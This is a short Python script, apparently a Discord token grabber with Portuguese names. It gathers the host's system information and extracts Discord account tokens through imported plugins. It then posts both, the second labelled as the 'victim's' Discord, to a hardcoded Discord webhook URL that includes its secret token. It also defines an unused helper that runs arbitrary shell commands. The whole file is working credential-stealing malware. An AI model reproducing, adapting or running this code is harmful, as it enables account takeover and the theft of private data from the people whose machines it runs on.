import subprocess
import requests
from plugins.systeminfo import obter_informacoes_sistema  
from plugins.discordtoken import TokenExtractor

DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1284222512514727937/A08myURhvEgEJ2_76NX_gQa3vVr2ZG1VBiShR9_xRepZlpu-JxSQUe84vgWUzSxf9A3i'

def executar_comando(comando):
    try:
        resultado = subprocess.check_output(comando, shell=True, text=True)
        return resultado
    except subprocess.CalledProcessError as e:
        return f"Erro ao executar o comando: {e}"

def enviar_para_discord(mensagem):
    payload = {
        'content': mensagem
    }
    response = requests.post(DISCORD_WEBHOOK_URL, json=payload)
    if response.status_code != 204:
        print(f"Erro ao enviar para o Discord: {response.status_code} - {response.text}")

if __name__ == "__main__":
    informacoes_sistema = obter_informacoes_sistema()
    discord_info = TokenExtractor().get_tokens()

    enviar_para_discord(f"Informações do Sistema:\n{informacoes_sistema}")
    enviar_para_discord(f"Discord da vitima:\n{discord_info}")
